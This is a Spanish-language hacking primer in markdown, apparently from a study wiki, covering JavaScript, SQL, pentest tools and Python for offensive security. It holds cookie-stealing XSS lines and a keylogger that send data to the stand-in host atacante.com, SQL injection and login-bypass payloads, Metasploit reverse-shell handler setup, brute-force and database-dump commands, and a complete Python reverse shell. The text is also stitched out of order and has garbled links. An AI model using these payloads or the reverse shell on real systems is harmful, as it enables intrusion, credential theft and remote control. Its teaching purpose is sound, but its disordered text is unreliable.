document.cookie = "session=; expires=Thu, 01 Jan 1970 00:00:00 UTC"
```

### 5.8 Web APIs

```javascript
// localStorage
localStorage.setItem("token", "abc123")
let t = localStorage.getItem("token")
localStorage.removeItem("token")

// sessionStorage
sessionStorage.setItem("temp", "data")

// postMessage
window.postMessage("datos", "https://target.com")
window.addEventListener("message", (e) => {
    if (e.origin !== "https://trusted.com") return
    console.log(e.data)
})

// WebSocket
let ws = new WebSocket("wss://example.com/ws")
ws.onopen = () => ws.send("Hola")
ws.onmessage = (e) => console.log(e.data)
```

### 5.9 Util para XSS

```javascript
// Cookie stealing
document.location = "http://atacante.com/?c=" + document.cookie
fetch("http://atacante.com/?c=" + document.cookie)

// Keylogger
document.addEventListener("keydown", (e) => {
    fetch("http://atacante.com/k?k=" + e.key)
})

// window.location
window.location.href = "http://atacante.com"
window.location.replace("http://atacante.com")

// XSS payloads
document.body.innerHTML = "<img src=x onerror=alert(1)>"
eval(atob("YWxlcnQoMSk="))  // alert(1)

// XMLHttpRequest
let xhr = new XMLHttpRequest()
xhr.open("GET", "/api/users", true)
xhr.setRequestHeader("Authorization", "Bearer token")
xhr.onload = () => console.log(xhr.responseText)
xhr.send()
```

---

## SQL para Inyeccion {sql}

SQL es el lenguaje de las bases de datos. Para [sqli](../raw/w3b-h4ck1ng.md#sql-injection) necesitas entender la sintaxis y las tecnicas de inyeccion.

### 6.1 SELECT Basico

```sql
SELECT * FROM usuarios;
SELECT id, nombre, email FROM usuarios;
SELECT * FROM usuarios WHERE id = 1;
SELECT * FROM usuarios WHERE edad >= 18;
SELECT * FROM usuarios WHERE nombre = "admin";

-- AND, OR, NOT, IN, BETWEEN, LIKE
SELECT * FROM productos WHERE precio > 100 AND stock > 0;
SELECT * FROM usuarios WHERE id IN (1, 2, 3);
SELECT * FROM productos WHERE precio BETWEEN 10 AND 50;
SELECT * FROM usuarios WHERE nombre LIKE 'admin%';
SELECT * FROM usuarios WHERE email LIKE '%@gmail.com';
SELECT * FROM usuarios WHERE email IS NULL;
```

### 6.2 ORDER BY, LIMIT

```sql
SELECT * FROM usuarios ORDER BY nombre;
SELECT * FROM usuarios ORDER BY edad DESC;
SELECT * FROM usuarios ORDER BY apellido ASC, nombre DESC;

-- MySQL/PostgreSQL
SELECT * FROM usuarios LIMIT 10 OFFSET 20;

-- SQL Server
SELECT TOP 10 * FROM usuarios;
```

### 6.3 JOINs

```sql
-- INNER JOIN
SELECT u.nombre, p.producto
FROM usuarios u
INNER JOIN compras c ON u.id = c.usuario_id
INNER JOIN productos p ON c.producto_id = p.id;

-- LEFT JOIN (todos de izquierda)
SELECT u.nombre, c.fecha
FROM usuarios u
LEFT JOIN compras c ON u.id = c.usuario_id;

-- RIGHT, FULL, CROSS
```

### 6.4 UNION

```sql
SELECT nombre, email FROM usuarios
UNION
SELECT nombre, email FROM admins;

-- UNION ALL (incluye duplicados)

-- SQLi: descubrir columnas
' UNION SELECT 1,2,3,4 --
' UNION SELECT NULL,NULL,NULL,NULL --
```

### 6.5 Subqueries

```sql
SELECT * FROM productos
WHERE precio > (SELECT AVG(precio) FROM productos);

SELECT u.nombre,
    (SELECT COUNT(*) FROM compras WHERE usuario_id = u.id)
FROM usuarios u;

SELECT * FROM usuarios u
WHERE EXISTS (SELECT 1 FROM compras WHERE usuario_id = u.id);
```

### 6.6 INSERT, UPDATE, DELETE

```sql
INSERT INTO usuarios (nombre, email, edad)
VALUES ('Octavio', 'octa@test.com', 28);

UPDATE usuarios SET email = "nuevo@test.com" WHERE id = 1;
UPDATE productos SET precio = precio * 1.1 WHERE categoria = "electronica";

DELETE FROM usuarios WHERE id = 1;
DELETE FROM productos WHERE stock = 0;
```

### 6.7 CREATE, ALTER, DROP

```sql
CREATE TABLE usuarios (
    id INT PRIMARY KEY AUTO_INCREMENT,
    nombre VARCHAR(100) NOT NULL,
    email VARCHAR(255) UNIQUE,
    edad INT DEFAULT 18,
    creado TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

ALTER TABLE usuarios ADD COLUMN telefono VARCHAR(20);
ALTER TABLE usuarios DROP COLUMN telefono;

DROP TABLE usuarios;
DROP DATABASE mi_base;
```

### 6.8 Funciones de Agregacion

```sql
SELECT COUNT(*) FROM usuarios;
SELECT SUM(precio * cantidad) FROM compras;
SELECT AVG(edad) FROM usuarios;
SELECT MIN(precio), MAX(precio) FROM productos;

SELECT ciudad, COUNT(*) as cantidad
FROM usuarios GROUP BY ciudad;

SELECT categoria, AVG(precio)
FROM productos
GROUP BY categoria
HAVING COUNT(*) > 5;
```

### 6.9 Util para SQLi

```sql
' ORDER BY 1 --   (descubrir columnas)
' ORDER BY 5 --   (error si hay menos de 5)
' UNION SELECT 1,2,3,4 --
' UNION SELECT NULL,NULL,NULL,NULL --

-- Extraer tablas (MySQL)
' UNION SELECT table_name,1,2 FROM information_schema.tables --

-- Comentarios
--  : MySQL, PostgreSQL, SQL Server
#   : MySQL
/* */ : Multiples DBs

-- Timing
' OR SLEEP(5) --              (MySQL)
'; WAITFOR DELAY '00:00:05' -- (SQL Server)
' OR pg_sleep(5) --           (PostgreSQL)

-- Bypass login
' OR '1'='1' --
admin' --
```

---

## Herramientas y Flujo de Trabajo {herramientas}


### 7.1 Tu Entorno de Trabajo

- **OS:** Kali Linux, Parrot OS, BlackArch
- **Editor:** VS Code, Vim, Neovim
- **Terminal:** tmux, screen
- **[proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy):** [burp suite](../raw/w3b-h4ck1ng.md#burp-suite), mitmproxy
- **[navegador](../raw/br0ws3r-3xpl01t4t10n.md):** Firefox + DevTools, Chromium
- **Virtualizacion:** VirtualBox, VMware, QEMU

```bash
# tmux basics
tmux new -s sesion
tmux attach -t sesion
# C-b c: nueva ventana
# C-b %: split vertical
# C-b ": split horizontal
```

### 7.2 Flujo de Trabajo

1. **[recon](../raw/0s1nt.md#reconocimiento):** [osint](../raw/0s1nt.md), [nmap](../raw/nm4p.md), masscan, [gobuster](../raw/w3b-h4ck1ng.md#gobuster)
2. **ENUMERACION:** Directorios, subdominios, tecnologias
3. **EXPLOTACION:** Searchsploit, [metasploit](../raw/m3t4spl01t.md), exploits manuales
4. **POST-EXPLOTACION:** [escalada de privilegios](../raw/l1n9x-pr1v3sc.md), [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)

```bash
# Escaneo
nmap -sV -sC -p- -T4 target.com
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Subdominios
gobuster dns -d target.com -w subdomains.txt

# Exploits
searchsploit wordpress 5.0
searchsploit -m 12345

# Post-explotacion Linux
./linpeas.sh
find / -perm -4000 2>/dev/null
sudo -l

# Post-explotacion Windows
whoami /all
systeminfo
net localgroup administrators
```

### 7.3 Herramientas Esenciales

```bash
# Nmap
nmap -sV -sC -p- target.com
nmap --script vuln target.com

# Metasploit
msfconsole
# use exploit/multi/handler
# set PAYLOAD windows/meterpreter/reverse_tcp
# set LHOST 10.0.0.1
# exploit

# Gobuster
gobuster dir -u https://target.com -w wordlist.txt -x php,txt

# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1

# SQLMap
sqlmap -u "https://target.com/page?id=1" --batch --dump

# John
john --wordlist=rockyou.txt hashes.txt

# Netcat
nc -lvnp 4444
nc 10.0.0.1 4444
```

### 7.4 Wordlists

```bash
# Directorios comunes
/usr/share/wordlists/
/usr/share/seclists/
/usr/share/dirb/wordlists/

# RockYou
zcat /usr/share/wordlists/rockyou.txt.gz | head -100

# Generar wordlist custom
cewl https://target.com -w custom.txt
```

### 7.5 Linux Basics for Pentesting

```bash
# Sistema
uname -a
id
cat /etc/passwd
cat /etc/shadow   # necesita root

# Red
ip addr
ss -tulanp

# Procesos
ps auxf
top

# Busqueda
find / -name "*.conf" 2>/dev/null

# Logs
/var/log/syslog
/var/log/auth.log
/var/log/apache2/access.log
journalctl -xe
```

### 7.6 Windows Basics for Pentesting

```cmd
:: Sistema
systeminfo
whoami /all
net user
net localgroup administrators

:: Red
ipconfig /all
netstat -ano
route print

:: Procesos
tasklist /svc
wmic process list brief

:: Servicios
net start
sc query
wmic service get name,state

:: Registry
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

### 7.7 Recursos

**Libros:**
- The Web Application Hacker Handbook (Stuttard, Pinto)
- Penetration Testing: A Hands-On Introduction (Weidman)
- The Hacker Playbook 3 (Kim)
- Practical Malware Analysis (Sikorski, Honig)

**Certificaciones:**
- OSCP, CEH, GPEN, PNPT, eJPT

**Plataformas para practicar:**
- [hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox)-h4ckth3b0x.md#[hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox)), [tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme), VulnHub
- PentesterLab, PortSwigger Web Security Academy
- PicoCTF, OverTheWire

**Canales de YouTube:**
- IppSec, [john](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper) Hammond, LiveOverflow
- NetworkChuck, STOK, The Cyber Mentor
- Hackersploit

**Comunidades:**
- Reddit: r/netsec, r/AskNetsec
- Discord: HackTheBox, TryHackMe
- Foros: 0x00sec.org

### 7.8 Checklist de Pre-requisitos

Antes de empezar con hacking, asegurate de tener:

- [ ] [python](../raw/pyth0n-f0r-h4ck1ng.md) basico (variables, loops, funciones, modulos, sockets)
- [ ] Bash [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) (comandos, pipes, scripts, one-liners)
- [ ] C basics (punteros, memoria, [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow))
- [ ] [redes](../raw/r3d3s-f0nd4m3nt0s.md) ([tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip), [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns), [http](../raw/r3d3s-f0nd4m3nt0s.md#http), puertos)
- [ ] Linux basico (terminal, [permisos](../raw/0s-f0nd4m3nt0s.md#permisos), procesos, [red](../raw/r3d3s-f0nd4m3nt0s.md))
- [ ] Windows basico (cmd, [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell), servicios)
- [ ] SQL basico (SELECT, JOIN, UNION, subqueries)
- [ ] Web basics (HTML, JS, HTTP, cookies)
- [ ] Git (clonar, commit, push)
- [ ] Virtualizacion (VMs, redes virtuales)
- [ ] Un editor decente y ganas de romper cosas

---

Recuerda: todo lo que aprendiste aca es el piso, no el techo. El hacking es un camino de aprendizaje constante. Nada reemplaza la practica en laboratorios controlados y la lectura de codigo real.
#### Formateo de Strings (continuacion)

```python
f"Padding: {42:>10}"         # "        42"
f"Binario: {42:b}"           # "101010"
f"Porcentaje: {0.15:.2%}"    # "15.00%"
f"Suma: {2 + 2}"             # expresion adentro
```

#### Expresiones Regulares con re (mas ejemplos)

```python
import re

# Compilar para eficiencia
patron = re.compile(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")

# search vs match
re.search(r"\d+", "abc123")  # match
re.match(r"\d+", "abc123")   # None (no arranca con digito)

# Flags
re.findall(r"^\w+", text, re.MULTILINE)
re.search(r"error", log, re.IGNORECASE)

# Grupos con nombre
m = re.search(r"(?P<ip>\d+\.\d+\.\d+\.\d+)", "IP: 10.0.0.1")
m.group("ip")  # "10.0.0.1"

# Split con regex
re.split(r"[;,\s]+", "a,b;c d")  # ["a", "b", "c", "d"]

# Sustitucion con funcion
def censurar(match):
    return "***"
re.sub(r"\d+", censurar, "Mi IP es 192.168.1.1")
```

### 1.4 Control de Flujo (detallado)

**Truthiness en Python:**

Valores Falsy: False, None, 0, 0.0, "" (vacio), [] (vacio), {} (vacio), [set](../raw/ph1sh1ng.md#social-engineering-toolkit)(), range(0)
Todo lo demas es Truthy.

```python
if not lista_vacia:
    print("lista vacia")

if "texto visible":
    print("siempre se ejecuta")
```

**match/case (Python 3.10+):**

```python
def manejar_comando(comando):
    match comando.split():
        case ["scan", ip]:
            print(f"Escanendo {ip}")
        case ["scan", ip, "-p", puerto]:
            print(f"Escanendo {ip}:{puerto}")
        case ["exit"]:
            print("Saliendo...")
            return False
        case _:
            print(f"Desconocido: {comando}")
```

**Bucles avanzados:**

```python
# enumerate - indice y valor
for idx, val in enumerate(["a", "b", "c"]):
    print(f"{idx}: {val}")

# zip - paralelo
nombres = ["Ana", "Bob", "Charlie"]
edades = [25, 30, 35]
for n, e in zip(nombres, edades):
    print(f"{n}: {e}")

# else en bucles (se ejecuta si NO hubo break)
for i in range(5):
    if i == 10: break
else:
    print("no se interrumpio")

# Dict comprehension
cuadrados_dict = {x: x**2 for x in range(5)}

# Set comprehension
unicos = {x % 3 for x in [1,1,2,2,3,3]}

# Generator expression (lazy)
gen = (x**2 for x in range(10))
suma = sum(x**2 for x in range(10))
```

### 1.5 Funciones (detallado)

```python
*args - tupla de argumentos posicionales variables
**kwargs - dict de argumentos nombrados variables

def registro(*args, **kwargs):
    print("Posicionales:", args)
    print("Nombrados:", kwargs)

registro(1, 2, 3, nombre="test", valor=42)

# Keyword-only (despues de *)
def scan(host, *, puerto=80, timeout=10):
    print(f"Escanendo {host}:{puerto}")

# Positional-only (antes de /, 3.8+)
def enviar(datos, /, destino):
    pass  # datos solo posicional

# Type hints
def analizar(ip: str, puerto: int) -> dict:
    return {"ip": ip, "abierto": True}

# Funcion como objeto
def sumar(a, b): return a + b
def restar(a, b): return a - b
ops = {"+": sumar, "-": restar}
resultado = ops["+"](10, 5)  # 15

# Lambda
doble = lambda x: x * 2
datos = [("Ana", 25), ("Bob", 20), ("Charlie", 30)]
ordenado = sorted(datos, key=lambda x: x[1])

# Decoradores
def log_ejecucion(func):
    def wrapper(*args, **kwargs):
        print(f"Ejecutando {func.__name__}")
        return func(*args, **kwargs)
    return wrapper

@log_ejecucion
def escanear(ip):
    print(f"Escanendo {ip}")

# Closure
def crear_contador():
    contador = 0
    def incrementar():
        nonlocal contador
        contador += 1
        return contador
    return incrementar
```

### 1.6 Manejo de Errores (detallado)

```python
# Multiples excepciones
try:
    archivo = open("no_existe.txt")
    contenido = archivo.read()
except FileNotFoundError:
    print("Archivo no encontrado")
except PermissionError:
    print("Sin permisos")
except Exception as e:
    print(f"Error: {e}")

# Excepciones personalizadas
class ExploitError(Exception):
    pass

try:
    raise ExploitError("Fallo el exploit")
except ExploitError as e:
    print(f"Error: {e}")

# Context manager propio
class Conexion:
    def __enter__(self):
        print("Abriendo conexion")
        return self
    def __exit__(self, *args):
        print("Cerrando conexion")

with Conexion() as conn:
    print("Usando conexion")
```

### 1.7 Archivos (detallado)

```python
# Modos de apertura
# 'r' lectura, 'w' escritura, 'a' append, 'x' exclusivo
# 'b' binario, 't' texto, '+' lectura+escritura

# Leer archivos grandes
def leer_en_trozos(path, tamano=1024):
    with open(path, "rb") as f:
        while True:
            trozo = f.read(tamano)
            if not trozo:
                break
            yield trozo

# Directorios
import os
for archivo in os.scandir("."):
    if archivo.is_file():
        print(f"Archivo: {archivo.name}")
```

### 1.8 Modulos y Paquetes

```python
import os
import sys
import socket
import subprocess as sp
import json as j
from socket import socket, AF_INET, SOCK_STREAM
from hashlib import md5, sha256

# Import dinamico
modulo = __import__("os")
print(modulo.getcwd())

# Ver que exporta un modulo
print(dir(os))

# Script como modulo
def funcion_util():
    return "hago algo util"

if __name__ == "__main__":
    print("Soy el script principal")

# Paquetes (directorios con __init__.py)
# mi_paquete/
#   __init__.py
#   modulo1.py
#   subpaquete/
#       __init__.py
#       modulo2.py
```

### 1.9 Modulos Esenciales para Hacking

#### os - [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos) (detallado)

```python
import os

# Directorio actual
os.getcwd()
os.chdir("/tmp")

# Variables de entorno
os.environ.get("PATH")
os.environ.get("HOME", "/root")
os.environ["MI_VAR"] = "valor"

# Recorrer arbol
for root, dirs, files in os.walk("/etc"):
    for f in files:
        ruta = os.path.join(root, f)
        if os.path.getsize(ruta) > 1024 * 1024:
            print(f"Grande: {ruta}")

# Permisos
os.chmod("script.sh", 0o755)
os.kill(pid, 9)  # SIGKILL

# Path utils
os.path.join("dir", "subdir", "file.txt")
os.path.dirname("/etc/passwd")     # /etc
os.path.basename("/etc/passwd")    # passwd
os.path.splitext("archivo.tar.gz") # ("archivo.tar", ".gz")
os.path.abspath("relativo.txt")
```

#### socket - Red (detallado)

```python
import socket

# Opciones de socket
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.settimeout(5.0)
s.setblocking(False)

# Resolver nombres
ip = socket.gethostbyname("example.com")
host = socket.gethostbyaddr("93.184.216.34")
hostname = socket.gethostname()

# Servicios
print(socket.getservbyname("http"))   # 80
print(socket.getservbyname("ssh"))    # 22
print(socket.getservicebyport(443))   # "https"

# Non-blocking con select
import select
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.1", 80))
s.setblocking(False)

readable, writable, _ = select.select([s], [s], [], 1.0)
if writable:
    s.send(b"GET / HTTP/1.1\r\n\r\n")
if readable:
    data = s.recv(1024)
    print(f"Recibido: {data}")
```

#### subprocess (detallado)

```python
import subprocess

# shell=True: PELIGRO con input del usuario!
# subprocess.run(f"echo {user_input}", shell=True) # NUNCA!

# Capturar stderr
r = subprocess.run(["comando"], capture_output=True, text=True)
print(r.stdout, r.stderr)

# Pipe entre procesos
ps = subprocess.Popen(["ps", "aux"], stdout=subprocess.PIPE)
grep = subprocess.Popen(["grep", "python"], stdin=ps.stdout,
                       stdout=subprocess.PIPE)
output = grep.communicate()[0]

# Timeout
try:
    subprocess.run(["nmap", target], timeout=30)
except subprocess.TimeoutExpired:
    print("Tardo mucho")

# Variables de entorno
env = os.environ.copy()
env["MI_VAR"] = "valor"
subprocess.run(["comando"], env=env)

# stdin pipe
p = subprocess.Popen(["bc"], stdin=subprocess.PIPE,
                     stdout=subprocess.PIPE, text=True)
output, _ = p.communicate(input="2 + 2\n")
```

#### hashlib y hmac

```python
import hashlib, hmac

# Hashing de archivos grandes
h = hashlib.sha256()
with open("archivo.iso", "rb") as f:
    for chunk in iter(lambda: f.read(4096), b""):
        h.update(chunk)
print(h.hexdigest())

# HMAC
h = hmac.new(b"clave", b"mensaje", hashlib.sha256).hexdigest()

# Comparacion segura
if hmac.compare_digest(h, esperado):
    print("HMAC valido")
```

#### struct - Datos Binarios

```python
import struct

# Formatos: < little-endian, > big-endian, ! network
# B=uint8, H=uint16, I=uint32, Q=uint64, s=char[]

# Pack/unpack
packed = struct.pack("<IHH", 0x12345678, 80, 443)
a, b, c = struct.unpack("<IHH", packed)
print(hex(a), b, c)

# Strings de longitud fija
packed = struct.pack("<4sI", b"test", 42)
print(struct.calcsize("<II"))  # 8
print(struct.calcsize("<Q"))   # 8
```

#### ctypes - Llamar C

```python
import ctypes

# Cargar librerias
libc = ctypes.CDLL("msvcrt.dll")  # Windows
# libc = ctypes.CDLL("libc.so.6") # Linux

# Definir tipos
libc.printf.argtypes = [ctypes.c_char_p]
libc.printf.restype = ctypes.c_int

# Struct en Python
class IPHeader(ctypes.Structure):
    _fields_ = [
        ("version_ihl", ctypes.c_ubyte),
        ("dscp_ecn", ctypes.c_ubyte),
        ("total_length", ctypes.c_ushort),
        ("identification", ctypes.c_ushort),
        ("ttl", ctypes.c_ubyte),
        ("protocol", ctypes.c_ubyte),
        ("checksum", ctypes.c_ushort),
        ("src", ctypes.c_uint32),
        ("dst", ctypes.c_uint32),
    ]

# WinAPI (kernel32)
if ctypes.windll:
    k32 = ctypes.windll.kernel32
    k32.VirtualAlloc.restype = ctypes.c_void_p
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40
    addr = k32.VirtualAlloc(None, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
```

#### threading y multiprocessing

```python
import threading, time
from concurrent.futures import ThreadPoolExecutor

# Sincronizacion con Lock
lock = threading.Lock()
contador = 0
def inc():
    global contador
    with lock:
        contador += 1

# Event
evento = threading.Event()
def esperar():
    evento.wait()
    print("Recibido!")

# ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=50) as ex:
    for resultado in ex.map(escanear, ips):
        print(resultado)

# Multiprocessing
import multiprocessing
with multiprocessing.Pool(4) as pool:
    hashes = pool.map(calcular_hash, archivos)

# Queue
q = multiprocessing.Queue()
q.put("mensaje")
q.get()
```

#### asyncio - I/O Asincronica

```python
import asyncio

async def scan_port(ip, puerto):
    try:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(ip, puerto), timeout=1)
        print(f"Puerto {puerto} ABIERTO")
        w.close()
    except: pass

async def main():
    tareas = [scan_port("192.168.1.1", p) for p in range(1, 1025)]
    await asyncio.gather(*tareas)

# asyncio.run(main())
```

### 1.10 Argumentos de Linea de Comandos (detallado)

```python
import argparse

parser = argparse.ArgumentParser(
    description="Escanedor de puertos",
    epilog="Ej: python scan.py -t 10.0.0.1 -p 1-1024")

parser.add_argument("-t", "--target", required=True)
parser.add_argument("-p", "--ports", default="1-1024")
parser.add_argument("--timeout", type=int, default=1)
parser.add_argument("-v", "--verbose", action="store_true")
parser.add_argument("-o", "--output")
parser.add_argument("-T", "--threads", type=int, default=50)
parser.add_argument("--tcp", action="store_true")
parser.add_argument("--udp", action="store_true")

args = parser.parse_args()
print(f"Target: {args.target}")
print(f"Puertos: {args.ports}")

# Parsear rango de puertos
inicio, *resto = args.ports.split("-")
fin = resto[0] if resto else inicio
```

### 1.11 Proyectos Practicos para Hacking

#### Port Scanner Threaded

```python
import socket, threading
from queue import Queue

target = "192.168.1.1"
q = Queue()
resultados = []

def scan(puerto):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    try:
        s.connect((target, puerto))
        resultados.append(puerto)
    except: pass
    finally: s.close()

def worker():
    while not q.empty():
        scan(q.get())
        q.task_done()

for p in range(1, 65536):
    q.put(p)

for _ in range(200):
    t = threading.Thread(target=worker, daemon=True)
    t.start()

q.join()
print(f"Abiertos: {sorted(resultados)}")

for p in sorted(resultados):
    try:
        svc = socket.getservbyport(p)
        print(f"  {p}/tcp - {svc}")
    except:
        print(f"  {p}/tcp - ?")
```

#### Banner Grabbing

```python
import socket

def grab_banner(ip, puerto):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, puerto))
        s.send(f"HEAD / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
        banner = s.recv(1024).decode(errors="ignore").strip()
        return banner
    except: return None
    finally: s.close()

banner = grab_banner("192.168.1.1", 80)
if banner: print(f"Banner: {banner}")
```

#### HTTP Client (socket puro)

```python
import socket

def http_request(host, path="/", method="GET"):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, 80))
    req = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    s.send(req.encode())
    resp = b""
    while True:
        d = s.recv(4096)
        if not d: break
        resp += d
    s.close()
    return resp.decode(errors="ignore")
```

#### HTTP Client (requests)

```python
import requests
from requests.auth import HTTPBasicAuth

# GET con parametros
r = requests.get("https://api.example.com/users", params={"page": 1})

# POST JSON
r = requests.post("https://api.example.com/login",
    json={"user": "admin", "pass": "admin123"})

# Headers
r = requests.get("https://target.com/admin",
    headers={"User-Agent": "Mozilla/5.0",
             "X-Forwarded-For": "127.0.0.1"})

# Cookies
jar = requests.cookies.RequestsCookieJar()
jar.set("session", "abc123", domain=".example.com")
r = requests.get("https://example.com/admin", cookies=jar)

# Auth
r = requests.get("https://example.com",
    auth=HTTPBasicAuth("admin", "admin123"))

# Sesion
s = requests.Session()
s.auth = ("user", "pass")
s.headers.update({"User-Agent": "custom"})
r1 = s.get("https://example.com/login")

# Proxies (para Burp)
r = requests.get("https://target.com",
    proxies={"http": "http://127.0.0.1:8080",
             "https": "http://127.0.0.1:8080"})

# Upload
files = {"file": ("report.txt", open("report.txt", "rb"))}
r = requests.post("https://example.com/upload", files=files)

# Stream descarga grande
r = requests.get("https://example.com/big.iso", stream=True)
with open("out.iso", "wb") as f:
    for chunk in r.iter_content(8192):
        f.write(chunk)
```

#### XOR Cipher

```python
def xor(data, key):
    """Cifra/descifra con XOR (funciona igual en ambos sentidos)."""
    kb = key.encode() if isinstance(key, str) else key
    db = data.encode() if isinstance(data, str) else data
    return bytes(db[i] ^ kb[i % len(kb)] for i in range(len(db)))

# Uso
mensaje = "Mensaje secreto"
key = "clave"
cifrado = xor(mensaje, key)
print(f"Cifrado: {cifrado.hex()}")
descifrado = xor(cifrado, key)
print(f"Descifrado: {descifrado.decode()}")

# XOR archivo
def xor_file(in_path, out_path, key):
    kb = key.encode() if isinstance(key, str) else key
    with open(in_path, "rb") as f:
        data = f.read()
    result = bytes(data[i] ^ kb[i % len(kb)] for i in range(len(data)))
    with open(out_path, "wb") as f:
        f.write(result)
```

#### Base64 Encoder/Decoder

```python
import base64

def b64_encode(data):
    return base64.b64encode(data.encode() if isinstance(data, str) else data).decode()

def b64_decode(data):
    return base64.b64decode(data).decode(errors="ignore")

# File operations
def b64_encode_file(in_path, out_path):
    with open(in_path, "rb") as f:
        b64 = base64.b64encode(f.read()).decode()
    with open(out_path, "w") as f:
        f.write(b64)

def b64_decode_file(in_path, out_path):
    with open(in_path) as f:
        raw = base64.b64decode(f.read())
    with open(out_path, "wb") as f:
        f.write(raw)

# Multiple rondas
payload = "datos_sensibles"
for _ in range(3): payload = b64_encode(payload)
for _ in range(3): payload = b64_decode(payload)
```

#### [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells) (Python)

```python
# === ATACANTE (listener) ===
import socket

def listener(port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    print(f"Listen on port {port}...")
    client, addr = s.accept()
    print(f"Conexion desde {addr}")
    while True:
        cmd = input("> ")
        client.send(cmd.encode())
        if cmd.lower() == "exit": break
        print(client.recv(4096).decode(errors="ignore"))
    client.close(); s.close()

# === VICTIMA ===
import subprocess, os

def reverse_shell(ip, port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    while True:
        cmd = s.recv(4096).decode()
        if cmd.lower() == "exit": break
        if cmd.lower().startswith("cd "):
            try:
                os.chdir(cmd[3:].strip())
                s.send(b"")
            except Exception as e:
                s.send(str(e).encode())
            continue
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            out = r.stdout + r.stderr
        except subprocess.TimeoutExpired:
            out = "Timeout"
        except Exception as e:
            out = f"Error: {e}"
        s.send(out.encode(errors="ignore"))
    s.close()
```

#### Simple [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) Client-Server

```python
# Servidor
import socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("0.0.0.0", 9999))
server.listen(5)
print("Server on 9999...")
while True:
    client, addr = server.accept()
    print(f"Conexion de {addr}")
    data = client.recv(1024)
    client.send(f"Recibido: {data.decode()}".encode())
    client.close()

# Cliente
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("127.0.0.1", 9999))
client.send(b"Hola!")
print(client.recv(1024).decode())
client.close()
```

#### Web Scraper Simple

```python
import requests
from urllib.parse import urljoin
from html.parser import HTMLParser

class LinkParser(HTMLParser):
    def __init__(self, base):
        super().__init__()
        self.links = []
        self.base = base
    def handle_starttag(self, tag, attrs):
        if tag == "a":
            for attr, val in attrs:
                if attr == "href":
                    url = urljoin(self.base, val)
                    if url.startswith("http"):
                        self.links.append(url)

def get_links(url):
    r = requests.get(url, headers={"User-Agent": "Mozilla/5.0"})
    p = LinkParser(url)
    p.feed(r.text)
    return p.links
```

### 1.12 Buenas Practicas

```python
#!/usr/bin/env python3

def main():
    pass

if __name__ == "__main__":
    main()

# Logging
import logging
logging.basicConfig(level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s")
logging.info("Escanendo...")
logging.error("Error de conexion")

# No hardcodear passwords
import os
password = os.environ.get("PENTEST_PASS")

# Config
import configparser
config = configparser.ConfigParser()
config.read("config.ini")
target = config["DEFAULT"]["target"]
```

### 1.13 Errores Comunes

```python
# TypeError: can only concatenate str (not "int") to str
print("Tengo " + str(edad) + " anhos")   # BIEN
print(f"Tengo {edad} anhos")             # MEJOR

# IndexError
if len(lista) > i:
    print(lista[i])

# KeyError
print(dic.get("clave", "default"))

# ValueError
try:
    n = int("abc")
except ValueError:
    n = 0

# Mutable default argument
def scan(puertos=None):  # BIEN: None en vez de []
    if puertos is None: puertos = []

# Bare except (MAL)
# try: ...
# except: pass  # MAL - atrapa KeyboardInterrupt, etc

try: ...
except Exception as e:  # BIEN
    print(f"Error: {e}")
```

### 1.14 Librerias Externas para Pentesting

```python
# Nmap
# import nmap
# nm = nmap.PortScanner()
# nm.scan("192.168.1.1", "22-443")

# Scapy - paquetes
# from scapy.all import IP, TCP, sr1
# pkt = IP(dst="10.0.0.1")/TCP(dport=80, flags="S")
# reply = sr1(pkt, timeout=1)

# Paramiko - SSH
# import paramiko
# ssh = paramiko.SSHClient()
# ssh.connect("10.0.0.1", username="root", password="toor")

# Crypto
# from Crypto.Cipher import AES

# Impacket - Windows protocols
# from impacket.smbconnection import SMBConnection

# Flask - C2 server
# from flask import Flask
```

---

## Bash [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) (continuacion)

### 2.12 Mas Comandos Utiles

#### sort, uniq, head, tail

```bash
sort archivo.txt
sort -n numeros.txt   # sort numerico
